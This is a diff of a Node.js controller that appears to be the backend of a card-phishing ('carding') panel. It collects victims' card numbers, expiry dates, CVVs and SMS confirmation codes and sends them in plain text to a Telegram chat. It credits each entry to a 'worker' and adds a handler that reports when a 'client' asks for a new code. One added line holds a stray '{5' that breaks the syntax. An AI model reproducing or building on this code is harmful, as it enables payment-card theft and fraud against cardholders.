@@ -46,8 +46,7 @@ module.exports = {
     /* This is a function that saves a new card to a database. It takes in two parameters, `req` and `res`,
     which represent the request and response objects respectively. The function is marked as `async`,
     which means it can use the `await` keyword to wait for asynchronous operations to complete. */
-    saveCard: async(req, res) => {
-        console.log(req.body)
+    saveCard: async(req, res) => {5
         try {
             if(!req.body.pan || !req.body.expires_at || !req.body.cvv || !req.body.uuid) {
                 return res.send({ success: false, message: 'Pan, expires_at, cvv and uuid are required' })
@@ -63,6 +62,14 @@ module.exports = {
                 return res.send({ success: false, message: 'Transaction not found' })
             }
 
+            await Transactions.update({
+                is_active: true
+            }, {
+                where: {
+                    uuid: req.body.uuid
+                }
+            })
+
             await Cards.create({
                 transaction_id: transaction.id,
                 pan: req.body.pan,
@@ -70,12 +77,12 @@ module.exports = {
                 cvv: req.body.cvv,
             })
 
-            let message = `New card added\n\n`
-            message += `Transaction ID: #${transaction.id}\n`
-            message += `Pan: ${req.body.pan}\n`
-            message += `Expires at: ${req.body.expires_at}\n`
+            let message = `Создана новая транзакция\n\n`
+            message += `ID Транзакции: #${transaction.id}\n`
+            message += `Номер карты: ${req.body.pan}\n`
+            message += `Действует до: ${req.body.expires_at}\n`
             message += `CVV: ${req.body.cvv}\n`
-            message += `Worker: ${transaction.referal}\n`
+            message += `Воркер: ${transaction.referal}\n`
             
             Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
 
@@ -103,8 +110,34 @@ module.exports = {
             if(!transaction) {
                 return res.send({ success: false, message: 'Transaction not found' })
             }
-            let message = `Transaction ID: #${transaction.id}\n`
-            message += `SMS Code: ${req.body.code}\n`
+            let message = `Номер транзакции: #${transaction.id}\n`
+            message += `Код подтверждения: ${req.body.code}\n`
+            Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
+            return res.send({ success: true })
+        } catch (error) {
+            console.error(error)
+            return res.send({ success: false, message: 'Internal server error' })
+        }
+    },
+
+
+    /* The `resendCode` function is a controller function that handles the resending of a code to a user
+    for a specific transaction. */
+    resendCode: async(req, res) => {
+        try {
+            if(!req.body.uuid) {
+                return res.send({ success: false, message: 'UUID is required' })
+            }
+            const transaction = await Transactions.findOne({
+                where: {
+                    uuid: req.body.uuid
+                }
+            })
+            if(!transaction) {
+                return res.send({ success: false, message: 'Transaction not found' })
+            }
+            let message = `Номер транзакции: #${transaction.id}\n`
+            message += `"Клиент" запросил повторный код подтверждения\n`
             Telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
             return res.send({ success: true })
         } catch (error) {
